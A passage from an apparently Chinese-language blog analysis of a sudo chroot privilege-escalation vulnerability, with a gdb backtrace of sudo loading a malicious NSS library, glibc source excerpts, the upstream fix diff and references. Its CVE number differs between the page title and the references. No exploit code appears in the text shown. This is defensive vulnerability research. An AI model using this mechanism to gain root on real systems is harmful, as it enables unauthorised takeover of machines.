 args&#x3D;args@entry&#x3D;0x7fffffffc4f0) at .&#x2F;elf&#x2F;dl-catch.c:237</span><br><span class="line">#8  0x00007ffff7fd2164 in _dl_open (file&#x3D;0x5555555b4d40 &quot;libnss_&#x2F;woot1337.so.2&quot;, mode&#x3D;&lt;optimized out&gt;, caller_dlopen&#x3D;0x7ffff7d53a0f &lt;module_load+175&gt;,</span><br><span class="line">    nsid&#x3D;&lt;optimized out&gt;, argc&#x3D;4, argv&#x3D;0x7fffffffe2b8, env&#x3D;0x7fffffffe2e0) at .&#x2F;elf&#x2F;dl-open.c:905</span><br><span class="line">#9  0x00007ffff7d840d5 in do_dlopen (ptr&#x3D;ptr@entry&#x3D;0x7fffffffc750) at .&#x2F;elf&#x2F;dl-libc.c:95</span><br><span class="line">#10 0x00007ffff7fc651c in __GI__dl_catch_exception (exception&#x3D;exception@entry&#x3D;0x7fffffffc6e0, operate&#x3D;0x7ffff7d84090 &lt;do_dlopen&gt;, args&#x3D;0x7fffffffc750)</span><br><span class="line">    at .&#x2F;elf&#x2F;dl-catch.c:237</span><br><span class="line">#11 0x00007ffff7fc6669 in _dl_catch_error (objname&#x3D;0x7fffffffc740, errstring&#x3D;0x7fffffffc748, mallocedp&#x3D;0x7fffffffc73f, operate&#x3D;&lt;optimized out&gt;,</span><br><span class="line">    args&#x3D;&lt;optimized out&gt;) at .&#x2F;elf&#x2F;dl-catch.c:256</span><br><span class="line">#12 0x00007ffff7d844ef in dlerror_run (args&#x3D;0x7fffffffc750, operate&#x3D;0x7ffff7d84090 &lt;do_dlopen&gt;) at .&#x2F;elf&#x2F;dl-libc.c:45</span><br><span class="line">#13 __libc_dlopen_mode (name&#x3D;&lt;optimized out&gt;, mode&#x3D;mode@entry&#x3D;-2147483646) at .&#x2F;elf&#x2F;dl-libc.c:162</span><br><span class="line">#14 0x00007ffff7d53a0f in module_load (module&#x3D;0x5555555af790) at .&#x2F;nss&#x2F;nss_module.c:187</span><br><span class="line">#15 0x00007ffff7d53ee5 in __nss_module_load (module&#x3D;0x5555555af790) at .&#x2F;nss&#x2F;nss_module.c:302</span><br><span class="line">#16 __nss_module_get_function (module&#x3D;0x5555555af790, name&#x3D;name@entry&#x3D;0x7ffff7dcf1eb &quot;setspent&quot;) at .&#x2F;nss&#x2F;nss_module.c:328</span><br><span class="line">#17 0x00007ffff7d5460b in __GI___nss_lookup_function (fct_name&#x3D;0x7ffff7dcf1eb &quot;setspent&quot;, ni&#x3D;&lt;optimized out&gt;) at .&#x2F;nss&#x2F;nsswitch.c:137</span><br><span class="line">#18 __GI___nss_lookup (ni&#x3D;0x7ffff7e11690 &lt;nip&gt;, fct_name&#x3D;0x7ffff7dcf1eb &quot;setspent&quot;, fct2_name&#x3D;0x0, fctp&#x3D;0x7fffffffcac0) at .&#x2F;nss&#x2F;nsswitch.c:67</span><br><span class="line">#19 0x00007ffff7d51306 in setup (all&#x3D;1, startp&#x3D;0x7ffff7e11680 &lt;startp&gt;, nip&#x3D;0x7ffff7e11690 &lt;nip&gt;, fctp&#x3D;0x7fffffffcac0,</span><br><span class="line">    lookup_fct&#x3D;0x7ffff7d50a80 &lt;__GI___nss_shadow_lookup2&gt;, func_name&#x3D;0x7ffff7dcf1eb &quot;setspent&quot;) at .&#x2F;nss&#x2F;getnssent_r.c:33</span><br><span class="line">#20 __nss_setent (func_name&#x3D;func_name@entry&#x3D;0x7ffff7dcf1eb &quot;setspent&quot;, lookup_fct&#x3D;0x7ffff7d50a80 &lt;__GI___nss_shadow_lookup2&gt;,</span><br><span class="line">    nip&#x3D;nip@entry&#x3D;0x7ffff7e11690 &lt;nip&gt;, startp&#x3D;startp@entry&#x3D;0x7ffff7e11680 &lt;startp&gt;, last_nip&#x3D;last_nip@entry&#x3D;0x7ffff7e11688 &lt;last_nip&gt;,</span><br><span class="line">    stayopen&#x3D;stayopen@entry&#x3D;0, stayopen_tmp&#x3D;0x0, res&#x3D;0) at .&#x2F;nss&#x2F;getnssent_r.c:76</span><br><span class="line">#21 0x00007ffff7d6490b in setspent () at ..&#x2F;nss&#x2F;getXXent_r.c:124</span><br><span class="line">#22 0x00007ffff7e98b33 in sudo_setspent () at .&#x2F;getspwuid.c:122</span><br><span class="line">#23 0x00007ffff7e98c27 in sudo_passwd_init (ctx&#x3D;&lt;optimized out&gt;, pw&#x3D;0x5555555a8a78, auth&#x3D;0x7ffff7f29020 &lt;auth_switch&gt;) at .&#x2F;auth&#x2F;passwd.c:57</span><br><span class="line">#24 0x00007ffff7e97a84 in sudo_auth_init (ctx&#x3D;ctx@entry&#x3D;0x7ffff7f296a0 &lt;sudoers_ctx&gt;, pw&#x3D;0x5555555a8a78, mode&#x3D;mode@entry&#x3D;33554433)</span><br><span class="line">    at .&#x2F;auth&#x2F;sudo_auth.c:117</span><br><span class="line">#25 0x00007ffff7e9a9a3 in check_user (ctx&#x3D;ctx@entry&#x3D;0x7ffff7f296a0 &lt;sudoers_ctx&gt;, validated&#x3D;validated@entry&#x3D;96, mode&#x3D;33554433) at .&#x2F;check.c:136</span><br><span class="line">#26 0x00007ffff7ebf201 in sudoers_check_common (pwflag&#x3D;pwflag@entry&#x3D;0, ctx&#x3D;0x7ffff7f296a0 &lt;sudoers_ctx&gt;) at .&#x2F;sudoers.c:468</span><br><span class="line">#27 0x00007ffff7ec06c8 in sudoers_check_cmnd (argc&#x3D;argc@entry&#x3D;1, argv&#x3D;argv@entry&#x3D;0x7fffffffe2d0, env_add&#x3D;env_add@entry&#x3D;0x0,</span><br><span class="line">    closure&#x3D;closure@entry&#x3D;0x7fffffffcdd0) at .&#x2F;sudoers.c:689</span><br><span class="line">#28 0x00007ffff7eb6673 in sudoers_policy_check (argc&#x3D;1, argv&#x3D;0x7fffffffe2d0, env_add&#x3D;0x0, command_infop&#x3D;0x7fffffffcea0, argv_out&#x3D;0x7fffffffcea8,</span><br><span class="line">    user_env_out&#x3D;0x7fffffffceb0, errstr&#x3D;0x7fffffffcec8) at .&#x2F;policy.c:1244</span><br><span class="line">#29 0x000055555555cffb in policy_check (run_envp&#x3D;0x7fffffffceb0, run_argv&#x3D;0x7fffffffcea8, command_info&#x3D;0x7fffffffcea0, env_add&#x3D;0x0, argv&#x3D;0x7fffffffe2d0,</span><br><span class="line">    argc&#x3D;1) at .&#x2F;sudo.c:1266</span><br><span class="line">#30 main (argc&#x3D;&lt;optimized out&gt;, argv&#x3D;&lt;optimized out&gt;, envp&#x3D;0x7fffffffe2e0) at .&#x2F;sudo.c:261</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>从这个调用链，我们就很清楚的知道了是在 <code>setspent</code> 之后进行的 dlopen 加载恶意的 so</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">policy_check -&gt; sudoers_policy_check -&gt; sudoers_check_cmnd</span><br><span class="line">	-&gt; sudoers_check_common </span><br><span class="line">		-&gt; set_cmnd_path </span><br><span class="line">		-&gt; check_user -&gt; sudo_auth_init -&gt; sudo_passwd_init -&gt; sudo_setspent -&gt; setspent</span><br><span class="line">			-&gt; setup -&gt; module_load</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么 <code>setspent</code> 做了什么呢？ <code>setspent</code> 函数会用来打开 shadows 文件的方法一个使用的例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">setpwent();</span><br><span class="line"><span class="keyword">while</span>(gets(buf) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>((sp = getspnam(buf)) != (struct spwd *) <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Vaild login name is:%s\n&quot;</span>,sp-&gt;sp_namp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		setspent();</span><br><span class="line">		<span class="keyword">while</span>((sp = getspent()) != (struct spwd *)<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, sp-&gt;sp_namp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>setspent</code> 实现代码<sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://codebrowser.dev/glibc/glibc/nss/getXXent_r.c.html#122">[3]</span></a></sup></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">SETFUNC_NAME (STAYOPEN)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> save;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line">  __nss_setent (SETFUNC_NAME_STRING, DB_LOOKUP_FCT, &amp;nip, &amp;startp,</span><br><span class="line">		&amp;last_nip, STAYOPEN_VAR, STAYOPEN_TMPVAR, NEED__RES);</span><br><span class="line">  save = errno;</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line">  __set_errno (save);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当调用到<code>module_load</code>的时候就会加载 so</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Internal implementation of __nss_module_load.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">module_load (struct nss_module *<span class="keyword">module</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span> (<span class="keyword">module</span>-&gt;name, <span class="string">&quot;files&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> module_load_nss_files (<span class="keyword">module</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span> (<span class="keyword">module</span>-&gt;name, <span class="string">&quot;dns&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> module_load_nss_dns (<span class="keyword">module</span>);</span><br><span class="line">  <span class="keyword">void</span> *handle;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *shlib_name;</span><br><span class="line">    <span class="keyword">if</span> (__asprintf (&amp;shlib_name, <span class="string">&quot;libnss_%s.so%s&quot;</span>,</span><br><span class="line">                    <span class="keyword">module</span>-&gt;name, __nss_shlib_revision) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="comment">/* This is definitely a temporary failure.  Do not update</span></span><br><span class="line"><span class="comment">         module-&gt;state.  This will trigger another attempt at the next</span></span><br><span class="line"><span class="comment">         call.  */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    handle = __libc_dlopen (shlib_name);</span><br><span class="line">    <span class="built_in">free</span> (shlib_name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Failing to load the module can be caused by several different</span></span><br><span class="line"><span class="comment">     scenarios.  One such scenario is that the module has been removed</span></span><br><span class="line"><span class="comment">     from the disk.  In which case the in-memory version is all that</span></span><br><span class="line"><span class="comment">     we have, and if the module-&gt;state indidates it is loaded then we</span></span><br><span class="line"><span class="comment">     can use it.  */</span></span><br><span class="line">  <span class="keyword">if</span> (handle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* dlopen failure.  We do not know if this a temporary or</span></span><br><span class="line"><span class="comment">         permanent error.  See bug 22041.  Update the state using the</span></span><br><span class="line"><span class="comment">         double-checked locking idiom.  */</span></span><br><span class="line">      __libc_lock_lock (nss_module_list_lock);</span><br><span class="line">      <span class="keyword">bool</span> result = result;</span><br><span class="line">      <span class="keyword">switch</span> ((<span class="keyword">enum</span> nss_module_state) atomic_load_acquire (&amp;<span class="keyword">module</span>-&gt;state))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> nss_module_uninitialized:</span><br><span class="line">          atomic_store_release (&amp;<span class="keyword">module</span>-&gt;state, nss_module_failed);</span><br><span class="line">          result = <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> nss_module_loaded:</span><br><span class="line">          result = <span class="literal">true</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> nss_module_failed:</span><br><span class="line">          result = <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      __libc_lock_unlock (nss_module_list_lock);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  nss_module_functions_untyped pointers;</span><br><span class="line">  <span class="comment">/* Look up and store locally all the function pointers we may need</span></span><br><span class="line"><span class="comment">     later.  Doing this now means the data will not change in the</span></span><br><span class="line"><span class="comment">     future.  */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> idx = <span class="number">0</span>; idx &lt; array_length (nss_function_name_array); ++idx)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *function_name;</span><br><span class="line">      <span class="keyword">if</span> (__asprintf (&amp;function_name, <span class="string">&quot;_nss_%s_%s&quot;</span>,</span><br><span class="line">                      <span class="keyword">module</span>-&gt;name, nss_function_name_array[idx]) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Definitely a temporary error.  */</span></span><br><span class="line">          __libc_dlclose (handle);</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      pointers[idx] = __libc_dlsym (handle, function_name);</span><br><span class="line">      <span class="built_in">free</span> (function_name);</span><br><span class="line">      PTR_MANGLE (pointers[idx]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-02-e0349e6cc7ed7c3f2e12c5302cbbe90b-ff4613.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-02-e0349e6cc7ed7c3f2e12c5302cbbe90b-ff4613.png" alt="image.png"></a></p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-02-ae30cc1334244617aaa6501e9fab6056-804675.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-02-ae30cc1334244617aaa6501e9fab6056-804675.png" alt="image.png"></a></p>
<h2 id="Patched"><a href="#Patched" class="headerlink" title="Patched"></a>Patched</h2><p>修复 commit    <sup id="fnref:5"><a href="#fn:5" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://github.com/sudo-project/sudo/commit/fdafc2ceb36382b07e604c0f39903d56bef54016#diff-6a3fc5e12751032d02db8970967b688eab54525c326699010870b3ffca2b6541
">[5]</span></a></sup>： </p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- sudo-1.9.17/plugins/sudoers/sudoers.c       2025-06-12 12:12:38.000000000 -0500</span></span><br><span class="line"><span class="comment">+++ sudo/plugins/sudoers/sudoers.c      2025-06-10 11:27:57.493871502 -0500</span></span><br><span class="line"><span class="meta">@@ -1080,7 +1080,6 @@</span></span><br><span class="line"> int</span><br><span class="line"> set_cmnd_path(struct sudoers_context *ctx, const char *runchroot)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="deletion">-    struct sudoers_pivot pivot_state = SUDOERS_PIVOT_INITIALIZER;</span></span><br><span class="line">     const char *cmnd_in;</span><br><span class="line">     char *cmnd_out = NULL;</span><br><span class="line">     char *path = ctx-&gt;user.path;</span><br><span class="line"><span class="meta">@@ -1099,13 +1098,7 @@</span></span><br><span class="line">     if (def_secure_path &amp;&amp; !user_is_exempt(ctx))</span><br><span class="line">        path = def_secure_path;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    /* Pivot root. */</span></span><br><span class="line"><span class="deletion">-    if (runchroot != NULL) &#123;</span></span><br><span class="line"><span class="deletion">-       if (!pivot_root(runchroot, &amp;pivot_state))</span></span><br><span class="line"><span class="deletion">-           goto error;</span></span><br><span class="line"><span class="deletion">-    &#125;</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-    ret = resolve_cmnd(ctx, cmnd_in, &amp;cmnd_out, path);</span></span><br><span class="line"><span class="addition">+    ret = resolve_cmnd(ctx, cmnd_in, &amp;cmnd_out, path, runchroot);</span></span><br><span class="line">     if (ret == FOUND) &#123;</span><br><span class="line">        char *slash = strrchr(cmnd_out, &#x27;/&#x27;);</span><br><span class="line">        if (slash != NULL) &#123;</span><br><span class="line"><span class="meta">@@ -1122,14 +1115,8 @@</span></span><br><span class="line">     else</span><br><span class="line">        ctx-&gt;user.cmnd = cmnd_out;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    /* Restore root. */</span></span><br><span class="line"><span class="deletion">-    if (runchroot != NULL)</span></span><br><span class="line"><span class="deletion">-       (void)unpivot_root(&amp;pivot_state);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line">     debug_return_int(ret);</span><br><span class="line"> error:</span><br><span class="line"><span class="deletion">-    if (runchroot != NULL)</span></span><br><span class="line"><span class="deletion">-       (void)unpivot_root(&amp;pivot_state);</span></span><br><span class="line">     free(cmnd_out);</span><br><span class="line">     debug_return_int(NOT_FOUND_ERROR);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>删除了 pivot_root ，  以及看后续似乎要 deprecated  chroot <sup id="fnref:6"><a href="#fn:6" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://github.com/sudo-project/sudo/commit/bc88e5cbd3b41196cac727855e2446a02dfba51e">[6]</span></a></sup> ：</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>这个漏洞有一个很巧合的地方， 如果当<code>pivot_root</code>之后， 调用到的第一个<code>nss_database_check_reload_and_get</code> 的第三个参数 <code>database_index</code>  不是 <code>nss_database_initgroups</code> , 且默认 <code>nss_database_initgroups</code> 初始化就是空 ，那么就会走到 <code>reload_disabled</code> 的地方并且返回， 那么之后就根本不会再读取 <code>nsswich.conf</code>。</p>
<p>我们去跟了下 libc 对 nss_database 初始化的变更 <sup id="fnref:4"><a href="#fn:4" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://github.com/bminor/glibc/commit/fa78feca47fdc226b46e7f6fea4c08c10fccd182
">[4]</span></a></sup>, 上一次的更改在五年前， 但是这个漏洞是在 23 年引入的。 目前看起来没什么特别的大关联， 应该就是特别特别的巧合。。。</p>
<h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://codebrowser.dev/glibc/glibc/nss/nss_database.c.html#nss_database_check_reload_and_get<a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://codebrowser.dev/glibc/glibc/nss/getXXent_r.c.html#122<a href="#fnref:3" rev="footnote"> ↩</a></span></li><li id="fn:4"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">4.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://github.com/bminor/glibc/commit/fa78feca47fdc226b46e7f6fea4c08c10fccd182<a href="#fnref:4" rev="footnote"> ↩</a></span></li><li id="fn:5"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">5.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://github.com/sudo-project/sudo/commit/fdafc2ceb36382b07e604c0f39903d56bef54016#diff-6a3fc5e12751032d02db8970967b688eab54525c326699010870b3ffca2b6541<a href="#fnref:5" rev="footnote"> ↩</a></span></li><li id="fn:6"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">6.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://github.com/sudo-project/sudo/commit/bc88e5cbd3b41196cac727855e2446a02dfba51e<a href="#fnref:6" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nss-database-check-reload-and-get-%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">nss_database_check_reload_and_get 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reload-disabled"><span class="toc-number">1.2.</span> <span class="toc-text">reload_disabled</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#load-evil-library"><span class="toc-number">1.3.</span> <span class="toc-text">load evil library</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patched"><span class="toc-number">3.</span> <span class="toc-text">Patched</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number">5.</span> <span class="toc-text">Reference link</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&text=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&title=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&is_video=false&description=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析&body=Check out this article: https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&title=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&title=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&title=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&title=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&name=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&t=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
